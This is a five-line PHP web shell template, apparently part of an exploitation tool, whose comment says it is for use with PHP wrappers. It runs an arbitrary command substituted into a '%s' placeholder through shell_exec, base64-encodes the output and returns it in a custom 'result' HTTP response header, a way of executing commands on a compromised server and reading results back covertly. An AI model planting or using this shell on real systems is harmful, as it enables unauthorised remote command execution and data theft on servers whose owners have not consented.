<?php /* this shell will be used for php wrappers */
$cmd = shell_exec('%s');
$cmd = base64_encode($cmd);
header("result: '$cmd'");
?>
